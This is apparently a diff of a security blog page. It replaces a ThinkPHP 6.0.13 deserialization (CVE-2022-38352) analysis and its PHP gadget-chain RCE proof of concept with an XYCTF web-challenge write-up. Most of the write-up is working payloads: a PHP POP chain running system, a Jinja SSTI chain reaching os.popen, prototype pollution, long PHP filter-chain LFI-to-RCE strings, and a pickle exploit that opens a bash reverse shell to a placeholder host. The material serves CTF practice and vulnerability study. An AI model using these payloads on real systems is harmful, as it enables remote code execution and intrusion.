@@ -13,47 +13,28 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/07/10/thinkphp6-0-13反序列化-cve-2022-38352-分析/"/>
+    <link rel="canonical" href="http://example.com/2024/04/29/xyctf-web题解/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="漏洞环境composer安装tp6.0.13 composer create-project topthink&#x2F;think&#x3D;6.0.13 tp6013  app\controller\Index.php添加反序列化利用点  漏洞分析全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php">
+        <meta name="description" content="ezPOPpayload ?xy&#x3D;O:3:&quot;CCC&quot;:2:&amp;#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&amp;#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&amp;#123;s:1:&quot;c&quot;;s:7:&quot;cat &#x2F;f*&quot;;s:1:&quot;d&quot;;s:0">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP6.0.13反序列化(CVE-2022-38352)分析">
-<meta property="og:url" content="http://example.com/2024/07/10/ThinkPHP6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="XYCTF Web题解">
+<meta property="og:url" content="http://example.com/2024/04/29/XYCTF-Web%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="漏洞环境composer安装tp6.0.13 composer create-project topthink&#x2F;think&#x3D;6.0.13 tp6013  app\controller\Index.php添加反序列化利用点  漏洞分析全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php">
+<meta property="og:description" content="ezPOPpayload ?xy&#x3D;O:3:&quot;CCC&quot;:2:&amp;#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&amp;#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&amp;#123;s:1:&quot;c&quot;;s:7:&quot;cat &#x2F;f*&quot;;s:1:&quot;d&quot;;s:0">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822732.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822106.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822678.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822200.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822065.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822279.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822340.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823407.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823609.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823312.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823383.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823095.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823281.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824363.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824665.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824333.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824923.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824388.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824527.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824161.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824815.png">
-<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824547.png">
-<meta property="og:image" content="http://example.com/images/image-20240710182029406.png">
-<meta property="article:published_time" content="2024-07-10T08:15:56.000Z">
-<meta property="article:modified_time" content="2024-08-22T10:24:43.828Z">
+<meta property="og:image" content="http://example.com/images/image-20240428220044417.png">
+<meta property="og:image" content="http://example.com/images/image-20240429202224853.png">
+<meta property="og:image" content="http://example.com/images/image-20240429203156683.png">
+<meta property="og:image" content="http://example.com/images/image-20240429203909728.png">
+<meta property="article:published_time" content="2024-04-29T13:16:22.000Z">
+<meta property="article:modified_time" content="2024-04-29T13:17:47.251Z">
 <meta property="article:author" content="p0l1st">
-<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822732.png">
+<meta name="twitter:image" content="http://example.com/images/image-20240428220044417.png">
     
     
     <!--- Icon Part-->
@@ -65,7 +46,7 @@
     
     <title>
         
-            ThinkPHP6.0.13反序列化(CVE-2022-38352)分析 -
+            XYCTF Web题解 -
         
         p0l1st&#39;s blog
     </title>
@@ -300,7 +281,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ThinkPHP6.0.13反序列化(CVE-2022-38352)分析</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">XYCTF Web题解</h1>
                 </div>
             
             </div>
@@ -321,15 +302,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-07-10 16:15:56</span>
-        <span class="mobile">2024-07-10 16:15:56</span>
+        <span class="desktop">2024-04-29 21:16:22</span>
+        <span class="mobile">2024-04-29 21:16:22</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-08-22 18:24:43</span>
-            <span class="mobile">2024-08-22 18:24:43</span>
+            <span class="desktop">2024-04-29 21:17:47</span>
+            <span class="mobile">2024-04-29 21:17:47</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -341,7 +322,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -367,127 +348,180 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>composer安装tp6.0.13</p>
-<pre><code>composer create-project topthink/think=6.0.13 tp6013
+            <h1 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h1><p>payload</p>
+<pre><code>?xy=O:3:&quot;CCC&quot;:2:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;s:7:&quot;cat /f*&quot;;s:1:&quot;d&quot;;s:0:&quot;&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;
+POST:
+a=array_pop&amp;b=system
 </code></pre>
-<p>app\controller\Index.php添加反序列化利用点</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822732.png" alt="image-20240710163053480"></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php的save方法，$this-&gt;autosave可控</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822106.png" alt="image-20240710163739513"></p>
-<p>由于其是抽象类，所以跟进其子类\src\Storage\Psr6Cache的save方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822678.png" alt="image-20240710163700241"></p>
-<p>$this-&gt;pool可控，所以可以调用任意类的_call方法，这里调用的是think\log\Channel类的call方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822200.png" alt="image-20240710164308899">****</p>
-<p>跟进log方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822065.png" alt="image-20240710164424955"></p>
-<p>继续跟进record方法，当$this-&gt;lazy为false时就能调用save方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822279.png" alt="image-20240710164623490"></p>
-<p>继续跟进save方法，$this-&gt;logger可控，可以调用任意类的save方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822340.png" alt="image-20240710164807192"></p>
-<p>跟进think\log\driver\Socket类中的save方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823407.png" alt="image-20240710165520884"></p>
-<p>首先需要绕过第一个判断，使check()方法返回true，跟进check方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823609.png" alt="image-20240710165853869"></p>
-<p>那么让$allowClientIds为空，$this-&gt;config[‘force_client_ids’]为true即可使check方法返回true</p>
-<p>回到save方法，$this-&gt;config[‘debug’]为true进入分支</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823312.png" alt="image-20240710170219974"></p>
-<p>给$this-&gt;app赋值为think\App类，而App类没有exists方法，会调用其父类Container的exists方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823383.png" alt="image-20240710171035012"></p>
-<p>跟进getAlias方法，发现其功能为根据别名获取真实类名，因为传入的$abstract为request，所以这个方法就会返回think\Request</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823095.png" alt="image-20240710171244927"></p>
-<p>回到exists方法，我们想要让其返回true只需要给$this-&gt;instances赋值为[‘think\Request’&#x3D;&gt;new Request()]即可</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823281.png" alt="image-20240710172146869"></p>
-<p>再回到save方法，接下来调用Request类的url方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824363.png" alt="image-20240710172506803"></p>
-<p>跟进url方法，这里会将我们可控的$this-&gt;url赋值给$url，并且由于传入的complete为true，会调用domain方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824665.png" alt="image-20240710172708415"></p>
-<p>跟进domain方法，返回协议:&#x2F;&#x2F;端口，然后在url方法中会拼接url</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824333.png" alt="image-20240710172944036"></p>
-<p>url方法的返回结果会赋值给$currentUri，然后进第三个if</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824923.png" alt="image-20240710180036659"></p>
-<p>给$this-&gt;config[‘format_head’]赋值，然后调用Container类的invoke方法</p>
-<p>跟进invoke方法，执行第三个return语句</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824388.png" alt="image-20240710180426215"></p>
-<p>跟进invokeMethod方法，如果我们传入的是数组，就将键赋值给class，值赋给method</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824527.png" alt="image-20240710180619986"></p>
-<p>下面的三行代码实现反射执行任意类的任意方法</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824161.png" alt="image-20240710180802255"></p>
-<p>其中$class和$method是我们控制的$this-&gt;config[‘format_head’]中的内容，$vars是$currentUri中的内容，拼接时传入的$this-&gt;url可控</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824815.png" alt="image-20240710181413961"></p>
-<p>下面我们就要寻找一个可以利用的类和方法，这里找的是think\view\Php类的display方法，跟进这个方法可以看到很明显的RCE</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824547.png" alt="image-20240710181602709"></p>
-<p>再回头看看$currentUri，前半部分是http:&#x2F;&#x2F;，后半部分是$this-&gt;url，那么我们只需要让$this-&gt;url为我们想要执行的代码即可</p>
-<h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><pre><code class="php">&lt;?php
+<p>exp</p>
+<pre><code class="php">&lt;?php
 
-namespace League\Flysystem\Cached\Storage&#123;
-
-    class Psr6Cache&#123;
-        private $pool;
-        protected $autosave = false;
-        public function __construct($exp)&#123;
-            $this-&gt;pool = $exp;
-        &#125;
-    &#125;
+class AAA
+&#123;
+    public $s;
+    public $a;
 &#125;
 
-namespace think\log&#123;
-    class Channel&#123;
-        protected $logger;
-        protected $lazy = true;
-
-        public function __construct($exp)&#123;
-            $this-&gt;logger = $exp;
-            $this-&gt;lazy = false;
-        &#125;
-    &#125;
+class BBB
+&#123;
+    public $c=&quot;cat /f*&quot;;
+    public $d=&quot;&quot;;
 &#125;
 
-namespace think&#123;
-    class Request&#123;
-        protected $url;
-        public function __construct()&#123;
-            $this-&gt;url = &#39;&lt;?php system(\&#39;calc\&#39;); exit(); ?&gt;&#39;;
-        &#125;
-    &#125;
-    class App&#123;
-        protected $instances = [];
-        public function __construct()&#123;
-            $this-&gt;instances = [&#39;think\Request&#39;=&gt;new Request()];
-        &#125;
-    &#125;
+class CCC
+&#123;
+    public $c;
 &#125;
 
-namespace think\view\driver&#123;
-    class Php&#123;&#125;
-&#125;
+$a= new AAA();
+$b= new BBB();
+$c= new CCC();
+$c-&gt;c=$a;
+$a-&gt;s=$b;
 
-namespace think\log\driver&#123;
+echo serialize($c);
+</code></pre>
+<h1 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h1><p>payload</p>
+<pre><code>我()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(293)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)操&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#39;cat /f*&#39;).read()
+</code></pre>
+<h1 id="ZZL的护理小课堂"><a href="#ZZL的护理小课堂" class="headerlink" title="ZZL的护理小课堂"></a>ZZL的护理小课堂</h1><pre><code class="javascript">        document.getElementById(&#39;quizForm&#39;).addEventListener(&#39;submit&#39;, function(event) &#123;
+            event.preventDefault(); 
+    
+            var formData = new FormData(this);
+    
+            var xhr = new XMLHttpRequest(); 
+            xhr.open(&#39;POST&#39;, &#39;getScore.php&#39;, true); 
+            xhr.onreadystatechange = function() &#123;
+                if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; 
+                    var score = xhr.responseText;
+                    if (score == 100) &#123;
+                        document.getElementById(&#39;scoreDisplay&#39;).innerText = &quot;你的分数是: &quot; + score + &quot;/100 杂鱼,怎么才100分啊&quot;;
+                    &#125; else if (score &lt; 100) &#123;
+                        document.getElementById(&#39;scoreDisplay&#39;).innerText = &quot;你的分数是: &quot; + score + &quot;/100 noooooob!!&quot;;
+                    &#125; else &#123;
+                        var flagXhr = new XMLHttpRequest(); 
+                        flagXhr.open(&#39;GET&#39;, &#39;flag.php&#39;, true);
+                        flagXhr.onreadystatechange = function() &#123;
+                            if (flagXhr.readyState === 4 &amp;&amp; flagXhr.status === 200) &#123;
+                                var flag = flagXhr.responseText;
+                                document.getElementById(&#39;scoreDisplay&#39;).innerText = &quot;Flag: &quot; + flag;
+                            &#125;
+                        &#125;;
+                        flagXhr.send(); // 发送请求获取 flag
+                    &#125;
+                &#125;
+            &#125;;
+            xhr.send(formData); // 发送请求获取分数
+        &#125;);
+    
+</code></pre>
+<p>javascript原型链污染</p>
+<p>payload:</p>
+<pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;score&quot;:&quot;100000000000000&quot;&#125;&#125;
+</code></pre>
+<pre><code>&#123;&quot;flag&quot;:&quot;XYCTF&#123;z2I_tE1L_You_13a006019b36&#125;\n&quot;&#125;
+</code></pre>
+<h1 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h1><p>payload:</p>
+<pre><code>http://localhost:44422/what&#39;s_this.php?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240428220044417.png" alt="image-20240428220044417"></p>
+<h1 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h1><p>F12 hint.php</p>
+<pre><code>/^[$|\(|\)|\@|\[|\]|\&#123;|\&#125;|\&lt;|\&gt;|\-]+$/
+</code></pre>
+<p>测试发现$&lt;就是&#x2F;flag，Linux中$()也可以执行命令，&lt;能将东西输入到命令</p>
+<p>payload</p>
+<pre><code>$$(&lt;$&lt;)
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240429202224853.png" alt="image-20240429202224853"></p>
+<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>register.php注册</p>
+<p>登录，发现cookie</p>
+<pre><code>RememberMe:
+gASVMgAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwDMTExlIwDcHdklIwDMTExlHViLg==
+</code></pre>
+<p>pickle反序列化</p>
+<p>exp：</p>
+<pre><code class="python">import pickle
+import os
+import base64
+payload = b&#39;&#39;&#39;(S&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1&quot;&#39;
+ios
+popen
+.&#39;&#39;&#39;
+print(base64.b64encode(payload))
+</code></pre>
+<p>反弹shell</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240429203156683.png" alt="image-20240429203156683"></p>
+<h1 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h1><p>index.php</p>
+<pre><code class="php">&lt;?php include_once($_REQUEST[&#39;file&#39;]);
+</code></pre>
+<p>根目录下有&#x2F;readflag</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
 
-    class Socket&#123;
-        protected $config = [];
-        protected $app;
-        public function __construct()&#123;
-
-            $this-&gt;config = [
-                &#39;debug&#39;=&gt;true,
-                &#39;force_client_ids&#39; =&gt; 1,
-                &#39;allow_client_ids&#39; =&gt; &#39;&#39;,
-                &#39;format_head&#39; =&gt; [new \think\view\driver\Php,&#39;display&#39;],
-            ];
-            $this-&gt;app = new \think\App();
-
-        &#125;
-    &#125;
-&#125;
-
-namespace&#123;
-    $c = new think\log\driver\Socket();
-    $b = new think\log\Channel($c);
-    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
-    echo urlencode(base64_encode(serialize($a)));
+int main(void) &#123;
+  char flag[256] = &#123;0&#125;;
+  FILE* fp = fopen(&quot;/flag&quot;, &quot;r&quot;);
+  if (!fp) &#123;
+    perror(&quot;fopen&quot;);
+    return 1;
+  &#125;
+  if (fread(flag, 1, 256, fp) &lt; 0) &#123;
+    perror(&quot;fread&quot;);
+    return 1;
+  &#125;
+  puts(flag);
+  fclose(fp);
+  return 0;
 &#125;
 </code></pre>
-<p><img src="/../images/image-20240710182029406.png" alt="image-20240710182029406"></p>
+<p>依然是通过filterchain</p>
+<pre><code>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.